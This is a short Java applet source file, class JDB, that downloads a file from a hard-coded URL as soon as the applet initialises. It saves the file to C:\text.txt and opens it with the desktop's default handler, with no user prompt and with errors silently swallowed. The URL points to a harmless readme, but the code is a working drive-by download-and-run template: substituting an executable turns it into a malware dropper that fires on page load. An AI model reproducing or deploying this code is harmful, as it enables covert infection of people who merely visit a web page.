import java.applet.Applet;
import java.awt.Desktop;
import java.io.File;
import java.io.FileOutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

@SuppressWarnings("serial")
public class JDB extends Applet{
	
	URL toDownload;
	String save;
	
	public void init(){
	try {
		toDownload = new URL("http://wordpress.org/plugins/about/readme.txt");
	} catch (MalformedURLException e1) {
	}
	save = "C:\\text.txt";//file to save to
	try {
		if(downloadFile(toDownload,save)){
			run(save);
		}
	} catch (Exception e) {
	}
	}
	
	private boolean downloadFile(URL url , String savePath) throws Exception{//download via Channels (up to 250% faster)
		
		ReadableByteChannel channel = Channels.newChannel(url.openStream());
		FileOutputStream out = new FileOutputStream(savePath);
		
		out.getChannel().transferFrom(channel, 0, Long.MAX_VALUE);
		out.flush();
		
		out.close();
		channel.close();
		
		return true;
	}
	private void run(String path) throws Exception{
		Desktop.getDesktop().open(new File(path));
	}
}
